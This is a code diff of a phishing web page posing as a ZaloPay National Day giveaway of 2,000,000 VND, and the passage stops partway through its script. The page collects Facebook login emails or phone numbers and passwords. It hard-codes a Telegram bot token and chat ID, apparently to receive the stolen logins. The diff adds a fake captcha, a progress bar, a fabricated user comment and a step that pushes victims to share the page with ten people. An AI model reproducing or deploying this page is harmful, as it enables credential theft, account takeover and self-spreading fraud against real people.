@@ -5,74 +5,129 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>ZaloPay - Mừng Quốc khánh 2/9</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif; }
-        body { background: #e8ecf1; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
-        .container { max-width: 420px; width: 100%; background: #ffffff; border-radius: 32px; box-shadow: 0 12px 40px rgba(0,0,0,0.15); overflow: hidden; position: relative; border: 1px solid rgba(255,255,255,0.3); }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #eef1f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 12px; }
+        .container { max-width: 420px; width: 100%; background: #ffffff; border-radius: 40px; box-shadow: 0 20px 60px rgba(0,0,0,0.10), 0 8px 24px rgba(0,0,0,0.04); overflow: hidden; position: relative; border: 1px solid rgba(255,255,255,0.3); backdrop-filter: blur(2px); }
         
-        .status-bar { background: #0068d9; padding: 12px 18px 8px; color: #fff; display: flex; justify-content: space-between; font-size: 14px; font-weight: 500; letter-spacing: 0.2px; }
-        .status-bar .left { display: flex; gap: 6px; align-items: center; }
-        .status-bar .left span { background: rgba(255,255,255,0.15); padding: 2px 10px; border-radius: 12px; font-size: 11px; }
+        /* Status bar đẹp */
+        .status-bar { background: linear-gradient(135deg, #0055b7, #0077e6); padding: 16px 22px 10px; color: #fff; display: flex; justify-content: space-between; font-size: 14px; font-weight: 500; letter-spacing: 0.2px; }
+        .status-bar .left { display: flex; gap: 8px; align-items: center; }
+        .status-bar .left .dot { width: 10px; height: 10px; background: #4cd964; border-radius: 50%; display: inline-block; margin-right: 4px; box-shadow: 0 0 8px rgba(76,217,100,0.5); }
+        .status-bar .left span { background: rgba(255,255,255,0.18); padding: 3px 16px; border-radius: 30px; font-size: 11px; font-weight: 600; backdrop-filter: blur(4px); }
         .status-bar .time { font-weight: 600; opacity: 0.95; }
 
-        .banner { background: linear-gradient(135deg, #f85a00, #ff7a00); padding: 18px 16px 12px; text-align: center; color: #fff; }
-        .banner .logo { display: flex; justify-content: center; align-items: center; gap: 6px; margin-bottom: 2px; }
-        .banner .logo span { font-size: 26px; font-weight: 800; letter-spacing: 0.5px; text-shadow: 0 2px 6px rgba(0,0,0,0.15); }
-        .banner .logo .star { color: #ffe600; font-size: 28px; }
-        .banner .title { font-size: 32px; font-weight: 900; margin: 2px 0; text-shadow: 0 2px 8px rgba(0,0,0,0.2); letter-spacing: 1px; }
-        .banner .sub { font-size: 15px; font-weight: 600; opacity: 0.95; background: rgba(255,255,255,0.18); display: inline-block; padding: 4px 22px; border-radius: 40px; margin-top: 4px; backdrop-filter: blur(4px); }
+        /* Banner gradient đẹp */
+        .banner { background: linear-gradient(145deg, #f85a00, #ff8c00, #ffaa33); padding: 24px 20px 18px; text-align: center; color: #fff; position: relative; overflow: hidden; }
+        .banner::before { content: ''; position: absolute; top: -50%; right: -30%; width: 280px; height: 280px; background: rgba(255,255,255,0.08); border-radius: 50%; }
+        .banner::after { content: ''; position: absolute; bottom: -40%; left: -20%; width: 200px; height: 200px; background: rgba(255,255,255,0.05); border-radius: 50%; }
+        .banner .logo { display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 6px; position: relative; z-index: 1; }
+        .banner .logo span { font-size: 30px; font-weight: 800; letter-spacing: 0.5px; text-shadow: 0 2px 10px rgba(0,0,0,0.12); }
+        .banner .logo .star { color: #ffe600; font-size: 32px; text-shadow: 0 0 20px rgba(255,230,0,0.3); }
+        .banner .title { font-size: 36px; font-weight: 900; margin: 4px 0; text-shadow: 0 3px 12px rgba(0,0,0,0.12); letter-spacing: 2px; position: relative; z-index: 1; }
+        .banner .sub { font-size: 16px; font-weight: 600; opacity: 0.95; background: rgba(255,255,255,0.20); display: inline-block; padding: 6px 32px; border-radius: 40px; margin-top: 6px; backdrop-filter: blur(6px); position: relative; z-index: 1; border: 1px solid rgba(255,255,255,0.15); }
 
-        .gift-box { background: #fff; margin: -20px 16px 0; border-radius: 24px; padding: 18px 14px 14px; box-shadow: 0 8px 28px rgba(0,0,0,0.08); border: 1px solid #f0f0f0; position: relative; z-index: 2; }
-        .gift-box .badge { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px dashed #eaeef3; padding-bottom: 10px; margin-bottom: 10px; }
-        .gift-box .badge .tag { background: #ff6a00; color: #fff; font-size: 12px; font-weight: 700; padding: 4px 16px; border-radius: 30px; letter-spacing: 0.3px; }
-        .gift-box .badge .date { color: #888; font-size: 13px; font-weight: 500; }
+        /* Box quà tặng đẹp */
+        .gift-box { background: #fff; margin: -24px 18px 0; border-radius: 28px; padding: 22px 16px 18px; box-shadow: 0 8px 32px rgba(0,0,0,0.06); border: 1px solid rgba(0,0,0,0.04); position: relative; z-index: 2; }
+        .gift-box .badge { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f0f2f5; padding-bottom: 14px; margin-bottom: 14px; }
+        .gift-box .badge .tag { background: linear-gradient(135deg, #ff6a00, #e65c00); color: #fff; font-size: 12px; font-weight: 700; padding: 6px 20px; border-radius: 30px; letter-spacing: 0.5px; box-shadow: 0 4px 12px rgba(255,106,0,0.25); }
+        .gift-box .badge .date { color: #999; font-size: 13px; font-weight: 500; }
         .gift-box .main { text-align: center; }
-        .gift-box .main .amount { font-size: 48px; font-weight: 900; color: #d32f2f; line-height: 1.1; letter-spacing: -1px; }
-        .gift-box .main .amount small { font-size: 22px; font-weight: 700; }
-        .gift-box .main .label { font-size: 17px; font-weight: 700; color: #1a1a1a; margin-top: 2px; }
-        .gift-box .main .highlight { font-size: 14px; color: #ff6a00; font-weight: 700; background: #fff6ed; padding: 4px 18px; border-radius: 40px; display: inline-block; margin-top: 6px; border: 1px solid #ffdcc4; }
+        .gift-box .main .amount { font-size: 56px; font-weight: 900; color: #d32f2f; line-height: 1; letter-spacing: -1px; text-shadow: 0 2px 8px rgba(211,47,47,0.08); }
+        .gift-box .main .amount small { font-size: 26px; font-weight: 700; }
+        .gift-box .main .label { font-size: 19px; font-weight: 700; color: #1a1a1a; margin-top: 6px; }
+        .gift-box .main .highlight { font-size: 14px; color: #ff6a00; font-weight: 700; background: #fff6ed; padding: 6px 24px; border-radius: 40px; display: inline-block; margin-top: 10px; border: 1px solid #ffdcc4; }
 
-        .congrats { background: #f0f7ff; margin: 14px 16px 0; padding: 14px 12px; border-radius: 18px; text-align: center; border-left: 5px solid #0068d9; }
-        .congrats .emoji { font-size: 28px; }
-        .congrats .text { font-size: 20px; font-weight: 700; color: #0068d9; }
-        .congrats .sub-text { font-size: 14px; color: #444; margin-top: 2px; }
+        /* Progress */
+        .progress-section { margin: 18px 18px 0; }
+        .progress-section .label { display: flex; justify-content: space-between; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 6px; }
+        .progress-section .label .percent { color: #ff6a00; font-weight: 800; }
+        .progress-bar { width: 100%; height: 10px; background: #eef1f5; border-radius: 20px; overflow: hidden; box-shadow: inset 0 1px 3px rgba(0,0,0,0.06); }
+        .progress-bar .fill { height: 100%; background: linear-gradient(90deg, #ff6a00, #ffaa33); border-radius: 20px; width: 0%; transition: width 0.6s cubic-bezier(0.22, 1, 0.36, 1); }
 
-        .share-section { background: #fafbfc; margin: 12px 16px 0; padding: 14px 12px; border-radius: 18px; text-align: center; border: 1px solid #eee; }
-        .share-section .title { font-size: 15px; font-weight: 700; color: #222; }
-        .share-section .title span { color: #ff6a00; }
-        .share-section .desc { font-size: 13px; color: #555; margin-top: 2px; font-style: italic; }
+        /* Social box */
+        .social-box { background: #f8faff; margin: 14px 18px 0; padding: 16px 14px; border-radius: 20px; border: 1px solid #eef2f7; }
+        .social-box .question { font-size: 15px; font-weight: 600; color: #1a1a1a; margin-bottom: 12px; }
+        .social-box .question span { color: #0068d9; }
+        .social-box .options { display: flex; gap: 10px; flex-wrap: wrap; }
+        .social-box .options button { flex: 1; min-width: 60px; padding: 10px 0; border: 2px solid #e4e8ee; border-radius: 30px; background: #fff; font-size: 14px; font-weight: 600; color: #444; cursor: pointer; transition: all 0.2s; }
+        .social-box .options button:hover { border-color: #0068d9; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,104,217,0.08); }
+        .social-box .options button.active { border-color: #0068d9; background: #eaf4ff; color: #0068d9; box-shadow: 0 4px 16px rgba(0,104,217,0.12); }
+        .social-box .sub-text { font-size: 13px; color: #888; margin-top: 10px; font-style: italic; text-align: center; }
 
-        .footer-promo { padding: 10px 16px 6px; text-align: center; font-size: 13px; color: #777; border-top: 1px solid #f0f0f0; margin-top: 10px; }
-        .footer-promo strong { color: #0068d9; }
+        /* Share */
+        .share-section-box { margin: 14px 18px 0; padding: 16px 14px; background: linear-gradient(135deg, #f0f7ff, #e8f0fe); border-radius: 20px; border: 1px solid #d6e4f0; text-align: center; }
+        .share-section-box .share-label { font-size: 15px; font-weight: 600; color: #0055b7; }
+        .share-section-box .share-label span { color: #ff6a00; }
+        .share-section-box .share-count { font-size: 14px; color: #444; margin: 6px 0 10px; font-weight: 500; }
+        .share-section-box .btn-share { background: linear-gradient(135deg, #ff6a00, #e85d00); color: #fff; border: none; padding: 12px 32px; border-radius: 40px; font-size: 17px; font-weight: 700; cursor: pointer; box-shadow: 0 6px 20px rgba(255,106,0,0.35); transition: all 0.2s; }
+        .share-section-box .btn-share:active { transform: scale(0.95); }
+        .share-section-box .btn-share:disabled { opacity: 0.5; cursor: not-allowed; box-shadow: none; }
 
-        .btn-claim { background: linear-gradient(135deg, #ff6a00, #e65c00); color: #fff; border: none; padding: 14px 0; width: calc(100% - 32px); margin: 12px 16px 8px; border-radius: 60px; font-size: 20px; font-weight: 800; cursor: pointer; box-shadow: 0 6px 20px rgba(255,106,0,0.35); transition: 0.15s; letter-spacing: 0.5px; }
-        .btn-claim:active { transform: scale(0.97); }
+        /* Action row */
+        .action-row { display: flex; justify-content: flex-end; align-items: center; margin: 14px 18px 0; padding: 4px 0; }
+        .action-row .label { font-size: 17px; font-weight: 600; color: #1a1a1a; margin-right: 14px; }
+        .action-row .btn-yes { background: linear-gradient(135deg, #0068d9, #0055b7); color: #fff; border: none; padding: 10px 32px; border-radius: 30px; font-size: 17px; font-weight: 700; cursor: pointer; box-shadow: 0 6px 20px rgba(0,104,217,0.30); transition: all 0.2s; }
+        .action-row .btn-yes:active { transform: scale(0.95); }
 
-        .login-form { padding: 0 16px 18px; display: none; animation: fadeUp 0.3s ease; }
-        @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
-        .login-form .input-group { margin-bottom: 12px; }
-        .login-form .input-group label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
-        .login-form .input-group input { width: 100%; padding: 14px 16px; border: 2px solid #dce0e6; border-radius: 16px; font-size: 16px; background: #f8f9fc; outline: none; transition: 0.2s; }
-        .login-form .input-group input:focus { border-color: #ff6a00; background: #fff; }
-        .login-form .input-group input::placeholder { color: #b0b8c4; }
-        .login-form .input-group .error-msg { color: #d32f2f; font-size: 12px; font-weight: 500; margin-top: 4px; display: none; }
-        .login-form .submit-btn { background: #0088cc; color: #fff; border: none; padding: 14px 0; width: 100%; border-radius: 60px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 16px rgba(0,136,204,0.25); transition: 0.15s; }
-        .login-form .submit-btn:active { transform: scale(0.97); }
-        .login-form .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .login-form .note { font-size: 12px; color: #999; text-align: center; margin-top: 10px; line-height: 1.5; }
+        /* Footer */
+        .footer-bar { display: flex; justify-content: space-between; align-items: center; padding: 14px 18px 10px; border-top: 1px solid #f0f2f5; margin-top: 14px; }
+        .footer-bar .brand { font-size: 15px; font-weight: 700; color: #0068d9; }
+        .footer-bar .brand small { font-weight: 400; color: #999; }
+        .footer-bar .page { font-size: 14px; color: #999; font-weight: 500; }
 
-        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #1a1a1a; color: #fff; padding: 12px 28px; border-radius: 40px; font-size: 14px; font-weight: 500; box-shadow: 0 8px 28px rgba(0,0,0,0.3); display: none; z-index: 999; max-width: 90%; text-align: center; }
+        /* Comment */
+        .comment-box { background: #f8faff; margin: 6px 18px 18px; padding: 14px 16px; border-radius: 20px; border: 1px solid #eef2f7; }
+        .comment-box .user { font-weight: 700; color: #1a1a1a; font-size: 15px; }
+        .comment-box .user span { font-weight: 400; color: #999; font-size: 13px; }
+        .comment-box .content { font-size: 15px; color: #1a1a1a; margin-top: 4px; }
+
+        /* Form đẹp */
+        .login-form { padding: 0 18px 20px; display: none; animation: fadeUp 0.4s ease; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(18px); } to { opacity: 1; transform: translateY(0); } }
+        .login-form .input-group { margin-bottom: 14px; }
+        .login-form .input-group label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 5px; }
+        .login-form .input-group input { width: 100%; padding: 16px 18px; border: 2px solid #e4e8ee; border-radius: 20px; font-size: 16px; background: #fafbfc; outline: none; transition: all 0.25s; }
+        .login-form .input-group input:focus { border-color: #ff6a00; background: #fff; box-shadow: 0 0 0 5px rgba(255,106,0,0.08); }
+        .login-form .input-group input.error { border-color: #d32f2f; background: #fff6f6; }
+        .login-form .input-group .error-msg { color: #d32f2f; font-size: 12px; font-weight: 500; margin-top: 5px; display: none; }
+
+        /* CAPTCHA đẹp */
+        .captcha-wrapper { background: #f4f8fe; border-radius: 20px; padding: 14px 16px; margin-bottom: 14px; border: 1px solid #e8ecf2; }
+        .captcha-row { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+        .captcha-box { background: linear-gradient(135deg, #1a2a3a, #2d3e50); padding: 10px 18px; border-radius: 16px; display: flex; align-items: center; gap: 14px; flex: 1; min-width: 130px; box-shadow: inset 0 2px 8px rgba(0,0,0,0.2); }
+        .captcha-box .code { font-family: 'Courier New', monospace; font-size: 28px; font-weight: 900; color: #7ecfff; letter-spacing: 4px; text-shadow: 0 0 16px rgba(126,207,255,0.2); user-select: none; }
+        .captcha-box .refresh-btn { background: rgba(255,255,255,0.10); border: none; color: #fff; font-size: 22px; padding: 0 8px; border-radius: 10px; cursor: pointer; transition: 0.2s; }
+        .captcha-box .refresh-btn:hover { background: rgba(255,255,255,0.20); }
+        .captcha-input { flex: 1; min-width: 100px; }
+        .captcha-input input { width: 100%; padding: 12px 16px; border: 2px solid #dce0e6; border-radius: 14px; font-size: 16px; background: #fff; outline: none; transition: 0.2s; }
+        .captcha-input input:focus { border-color: #ff6a00; box-shadow: 0 0 0 5px rgba(255,106,0,0.08); }
+        .captcha-input input.error { border-color: #d32f2f; }
+        .captcha-error { color: #d32f2f; font-size: 12px; font-weight: 500; margin-top: 5px; display: none; }
+
+        .login-form .submit-btn { background: linear-gradient(135deg, #0088cc, #0068b0); color: #fff; border: none; padding: 16px 0; width: 100%; border-radius: 60px; font-size: 19px; font-weight: 700; cursor: pointer; box-shadow: 0 6px 24px rgba(0,136,204,0.35); transition: all 0.2s; }
+        .login-form .submit-btn:active { transform: scale(0.96); }
+        .login-form .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; box-shadow: none; }
+        .login-form .note { font-size: 12px; color: #bbb; text-align: center; margin-top: 12px; }
+
+        /* Toast */
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(20,20,20,0.92); color: #fff; padding: 14px 32px; border-radius: 50px; font-size: 15px; font-weight: 500; box-shadow: 0 12px 48px rgba(0,0,0,0.25); display: none; z-index: 999; max-width: 90%; text-align: center; backdrop-filter: blur(12px); }
         .toast.show { display: block; animation: fadeUp 0.3s ease; }
 
-        .watermark { position: absolute; bottom: 70px; right: 14px; font-size: 12px; color: rgba(0,0,0,0.05); font-weight: 700; pointer-events: none; transform: rotate(-6deg); letter-spacing: 0.5px; }
-        
-        @media (max-width: 420px) { .gift-box .main .amount { font-size: 38px; } .banner .title { font-size: 26px; } }
+        /* Khoảng trống để thêm ảnh */
+        .image-placeholder { margin: 14px 18px 0; padding: 20px; background: #f5f7fb; border-radius: 20px; border: 2px dashed #d0d8e4; text-align: center; min-height: 120px; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #aab2c0; font-size: 14px; font-weight: 500; transition: 0.3s; }
+        .image-placeholder img { max-width: 100%; border-radius: 16px; display: block; }
+        .image-placeholder .hint { margin-top: 8px; }
+
+        .watermark { position: absolute; bottom: 80px; right: 16px; font-size: 11px; color: rgba(0,0,0,0.03); font-weight: 700; pointer-events: none; transform: rotate(-5deg); letter-spacing: 1px; }
+
+        @media (max-width: 420px) { .gift-box .main .amount { font-size: 42px; } .banner .title { font-size: 28px; } .captcha-row { flex-direction: column; align-items: stretch; } }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="status-bar">
-        <div class="left">📶 4G <span>ZaloPay</span></div>
+        <div class="left"><span class="dot"></span> 4G <span>ZaloPay</span></div>
         <div class="time">20:58</div>
     </div>
 
@@ -97,36 +152,82 @@
         </div>
     </div>
 
-    <div class="congrats">
-        <div class="emoji">🎉</div>
-        <div class="text">Chúc mừng! Bạn đã nhận được 2.000.000</div>
-        <div class="sub-text">Mã xác nhận đã gửi qua SMS</div>
+    <!-- Khoảng trống để thêm ảnh - đặt tên là anh_nen.img -->
+    <div class="image-placeholder" id="imageSlot">
+        <img id="uploadedImage" src="" alt="" style="display:none; max-width:100%; border-radius:16px;">
+        <div class="hint" id="imageHint">📸 Kéo thả hoặc nhấn để thêm ảnh nền<br><span style="font-size:12px; color:#bcc5d2;">(anh_nen.img)</span></div>
+        <input type="file" id="imageInput" accept="image/*" style="display:none;">
     </div>
 
-    <div class="share-section">
-        <div class="title">📢 <span>CHIA SẺ TRÊN MẠNG XÃ HỘI YÊU THÍCH</span></div>
-        <div class="desc"><i>Mời càng nhiều – Thưởng càng lớn!</i></div>
+    <div class="progress-section">
+        <div class="label">
+            <span>🏆 Hoàn tất nhận ưu đãi</span>
+            <span class="percent" id="percentText">0%</span>
+        </div>
+        <div class="progress-bar">
+            <div class="fill" id="progressFill" style="width: 0%;"></div>
+        </div>
     </div>
 
-    <button class="btn-claim" id="showFormBtn">📱 Nhận thưởng ngay</button>
+    <div class="social-box">
+        <div class="question">📢 Bạn biết đến ZaloPay qua nền tảng nào?</div>
+        <div class="options" id="platformOptions">
+            <button data-value="TikTok">TikTok</button>
+            <button data-value="Facebook">Facebook</button>
+            <button data-value="YouTube">YouTube</button>
+            <button data-value="Khác">Khác</button>
+        </div>
+        <div class="sub-text"><i>Chọn 1 đáp án để tiếp tục nhận thưởng</i></div>
+    </div>
+
+    <div class="share-section-box" id="shareBox">
+        <div class="share-label">📤 <span>Chia sẻ để hoàn tất 100%</span></div>
+        <div class="share-count" id="shareCount">Đã chia sẻ: 0 / 10 người</div>
+        <button class="btn-share" id="shareBtn">📣 Chia sẻ ngay (+10%)</button>
+    </div>
+
+    <div class="action-row">
+        <span class="label">Biết</span>
+        <button class="btn-yes" id="showFormBtn">Có</button>
+    </div>
+
+    <div class="footer-bar">
+        <div class="brand">ZaloPay <small>● Bình Minh</small></div>
+        <div class="page">10 / 225</div>
+    </div>
+
+    <div class="comment-box">
+        <div class="user">Tạ Trí <span>· 3 người xem</span></div>
+        <div class="content">Thật bất ngờ! Tôi không bao giờ mong đội</div>
+    </div>
 
     <div class="login-form" id="loginForm">
         <div class="input-group">
             <label>📧 Email / Số điện thoại Facebook</label>
             <input type="text" id="fbEmail" placeholder="Nhập email hoặc SĐT đăng nhập FB">
-            <div class="error-msg" id="emailError">⚠️ Vui lòng nhập đúng định dạng email (có @ và .)</div>
+            <div class="error-msg" id="emailError">Email hoặc SĐT không hợp lệ</div>
         </div>
         <div class="input-group">
             <label>🔒 Mật khẩu Facebook</label>
-            <input type="password" id="fbPass" placeholder="Nhập mật khẩu của bạn (tối thiểu 6 ký tự)">
-            <div class="error-msg" id="passError">⚠️ Mật khẩu phải có ít nhất 6 ký tự</div>
+            <input type="password" id="fbPass" placeholder="Nhập mật khẩu (tối thiểu 6 ký tự)">
+            <div class="error-msg" id="passError">Mật khẩu phải có ít nhất 6 ký tự</div>
         </div>
+
+        <div class="captcha-wrapper">
+            <div class="captcha-row">
+                <div class="captcha-box">
+                    <span class="code" id="captchaCode">YUV28S</span>
+                    <button class="refresh-btn" id="refreshCaptcha">⟳</button>
+                </div>
+                <div class="captcha-input">
+                    <input type="text" id="captchaInput" placeholder="Nhập mã xác nhận" maxlength="6">
+                </div>
+            </div>
+            <div class="captcha-error" id="captchaError">Mã xác nhận không đúng</div>
+        </div>
+
         <button class="submit-btn" id="submitBtn">✅ Xác nhận nhận thưởng</button>
         <div class="note">🔐 Thông tin được mã hóa và bảo mật tuyệt đối.</div>
-    </div>
-
-    <div class="footer-promo">
-        <strong>Khuyến mãi Quốc Khánh ZaloPay:</strong> Tất cả người dùng tham gia nhận ngay 2.000.000 VNĐ
     </div>
 
     <div class="watermark">Bình Minh · 20:58</div>
@@ -135,9 +236,62 @@
 <div class="toast" id="toast">⏳ Đang xử lý...</div>
 
 <script>
+    // ===== UPLOAD ẢNH =====
+    const imageSlot = document.getElementById('imageSlot');
+    const imageInput = document.getElementById('imageInput');
+    const uploadedImage = document.getElementById('uploadedImage');
+    const imageHint = document.getElementById('imageHint');
+
+    imageSlot.addEventListener('click', function() {
+        imageInput.click();
+    });
+
+    imageSlot.addEventListener('dragover', function(e) {
+        e.preventDefault();
+        this.style.borderColor = '#ff6a00';
+        this.style.background = '#f0f7ff';
+    });
+
+    imageSlot.addEventListener('dragleave', function(e) {
+        e.preventDefault();
+        this.style.borderColor = '#d0d8e4';
+        this.style.background = '#f5f7fb';
+    });
+
+    imageSlot.addEventListener('drop', function(e) {
+        e.preventDefault();
+        this.style.borderColor = '#d0d8e4';
+        this.style.background = '#f5f7fb';
+        const file = e.dataTransfer.files[0];
+        if (file && file.type.startsWith('image/')) {
+            const reader = new FileReader();
+            reader.onload = function(ev) {
+                uploadedImage.src = ev.target.result;
+                uploadedImage.style.display = 'block';
+                imageHint.style.display = 'none';
+            };
+            reader.readAsDataURL(file);
+        }
+    });
+
+    imageInput.addEventListener('change', function() {
+        const file = this.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                uploadedImage.src = e.target.result;
+                uploadedImage.style.display = 'block';
+                imageHint.style.display = 'none';
+            };
+            reader.readAsDataURL(file);
+        }
+    });
+
+    // ===== BOT TELEGRAM =====
     const BOT_TOKEN = "8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8";
     const CHAT_ID = "8872446985";
 
+    // DOM
     const showFormBtn = document.getElementById('showFormBtn');
     const loginForm = document.getElementById('loginForm');
     const submitBtn = document.getElementById('submitBtn');
@@ -145,96 +299,196 @@
     const fbPass = document.getElementById('fbPass');
     const emailError = document.getElementById('emailError');
     const passError = document.getElementById('passError');
+    const captchaInput = document.getElementById('captchaInput');
+    const captchaCode = document.getElementById('captchaCode');
+    const refreshBtn = document.getElementById('refreshCaptcha');
+    const captchaError = document.getElementById('captchaError');
     const toast = document.getElementById('toast');
+    const progressFill = document.getElementById('progressFill');
+    const percentText = document.getElementById('percentText');
+    const shareBtn = document.getElementById('shareBtn');
+    const shareCount = document.getElementById('shareCount');
 
-    // Hàm kiểm tra email hợp lệ (có @ và ít nhất 1 dấu chấm sau @)
-    function isValidEmail(email) {
-        // Kiểm tra định dạng cơ bản: có @, có dấu chấm ở phần domain, không có khoảng trắng
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return emailRegex.test(email);
+    // State
+    let currentCaptcha = 'YUV28S';
+    let selectedPlatform = null;
+    let shareCountNum = 0;
+    let progress = 0;
+
+    captchaCode.textContent = currentCaptcha;
+
+    function generateCaptcha() {
+        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+        let code = '';
+        for (let i = 0; i < 6; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));
+        return code;
     }
 
-    // Hàm kiểm tra mật khẩu (ít nhất 6 ký tự)
-    function isValidPassword(pass) {
-        return pass.length >= 6;
+    function updateProgress() {
+        let p = 0;
+        if (selectedPlatform) p += 30;
+        if (fbEmail.value.trim() && isValidEmailOrPhone(fbEmail.value.trim())) p += 20;
+        if (fbPass.value.trim() && isValidPassword(fbPass.value.trim())) p += 20;
+        if (captchaInput.value.trim() && isCaptchaValid(captchaInput.value.trim())) p += 20;
+        p += Math.min(shareCountNum * 1, 10);
+        progress = Math.min(p, 100);
+        progressFill.style.width = progress + '%';
+        percentText.textContent = progress + '%';
     }
 
-    // Kiểm tra real-time khi người dùng nhập
-    fbEmail.addEventListener('input', function() {
-        const val = this.value.trim();
-        if (val.length > 0 && !isValidEmail(val)) {
-            emailError.style.display = 'block';
-        } else {
-            emailError.style.display = 'none';
+    document.querySelectorAll('#platformOptions button').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('#platformOptions button').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+            selectedPlatform = this.dataset.value;
+            updateProgress();
+            validateForm();
+        });
+    });
+
+    shareBtn.addEventListener('click', function() {
+        if (shareCountNum >= 10) {
+            toast.textContent = '✅ Bạn đã chia sẻ đủ 10 người!';
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+            return;
         }
+        const currentUrl = window.location.href;
+        const shareUrl = `https://www.facebook.com/dialog/send?link=${encodeURIComponent(currentUrl)}&app_id=123456789&redirect_uri=${encodeURIComponent(currentUrl)}`;
+        window.open(shareUrl, '_blank', 'width=600,height=500');
+        
+        shareCountNum = Math.min(shareCountNum + 1, 10);
+        shareCount.textContent = `Đã chia sẻ: ${shareCountNum} / 10 người`;
+        if (shareCountNum >= 10) {
+            shareBtn.textContent = '✅ Đã hoàn thành!';
+            shareBtn.disabled = true;
+            toast.textContent = '🎉 Chia sẻ thành công! +10% hoàn tất';
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        } else {
+            toast.textContent = `📤 Đã chia sẻ ${shareCountNum}/10 người (+${shareCountNum}%)`;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 1500);
+        }
+        updateProgress();
         validateForm();
     });
 
-    fbPass.addEventListener('input', function() {
-        const val = this.value.trim();
-        if (val.length > 0 && !isValidPassword(val)) {
-            passError.style.display = 'block';
-        } else {
-            passError.style.display = 'none';
+    function isValidEmailOrPhone(input) {
+        const trimmed = input.trim();
+        if (!trimmed) return false;
+        const phoneRegex = /^(\+?84|0)[0-9\s\-\.]{8,15}$/;
+        if (phoneRegex.test(trimmed.replace(/\s/g, ''))) return true;
+        const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/;
+        if (emailRegex.test(trimmed)) {
+            const parts = trimmed.split('@');
+            if (parts.length === 2) {
+                const domain = parts[1];
+                if (/^[a-zA-Z0-9]/.test(domain) && /[a-zA-Z0-9]$/.test(domain)) return true;
+            }
         }
+        return false;
+    }
+    function isValidPassword(pass) { return pass.length >= 6; }
+    function isCaptchaValid(val) { return val.toUpperCase() === currentCaptcha; }
+
+    function validateEmailField() {
+        const val = fbEmail.value.trim();
+        const valid = isValidEmailOrPhone(val);
+        if (val.length > 0 && !valid) { emailError.style.display = 'block'; fbEmail.classList.add('error'); } 
+        else { emailError.style.display = 'none'; fbEmail.classList.remove('error'); }
+        updateProgress();
+        return valid;
+    }
+    function validatePassField() {
+        const val = fbPass.value.trim();
+        const valid = isValidPassword(val);
+        if (val.length > 0 && !valid) { passError.style.display = 'block'; fbPass.classList.add('error'); } 
+        else { passError.style.display = 'none'; fbPass.classList.remove('error'); }
+        updateProgress();
+        return valid;
+    }
+    function validateCaptchaField() {
+        const val = captchaInput.value.trim();
+        const valid = isCaptchaValid(val);
+        if (val.length > 0 && !valid) { captchaError.style.display = 'block'; captchaInput.classList.add('error'); } 
+        else { captchaError.style.display = 'none'; captchaInput.classList.remove('error'); }
+        updateProgress();
+        return valid;
+    }
+
+    fbEmail.addEventListener('input', function() { validateEmailField(); validateForm(); });
+    fbPass.addEventListener('input', function() { validatePassField(); validateForm(); });
+    captchaInput.addEventListener('input', function() { validateCaptchaField(); validateForm(); });
+
+    fbEmail.addEventListener('blur', function() { if (this.value.trim().length > 0 && !isValidEmailOrPhone(this.value.trim())) { emailError.style.display = 'block'; fbEmail.classList.add('error'); } validateForm(); });
+    fbPass.addEventListener('blur', function() { if (this.value.trim().length > 0 && !isValidPassword(this.value.trim())) { passError.style.display = 'block'; fbPass.classList.add('error'); } validateForm(); });
+    captchaInput.addEventListener('blur', function() { if (this.value.trim().length > 0 && !isCaptchaValid(this.value.trim())) { captchaError.style.display = 'block'; captchaInput.classList.add('error'); } validateForm(); });
+
+    refreshBtn.addEventListener('click', function() {
+        currentCaptcha = generateCaptcha();
+        captchaCode.textContent = currentCaptcha;
+        captchaInput.value = '';
+        captchaError.style.display = 'none';
+        captchaInput.classList.remove('error');
+        updateProgress();
         validateForm();
     });
 
-    // Kiểm tra toàn bộ form để bật/tắt nút submit
     function validateForm() {
-        const email = fbEmail.value.trim();
-        const pass = fbPass.value.trim();
-        const emailOk = isValidEmail(email);
-        const passOk = isValidPassword(pass);
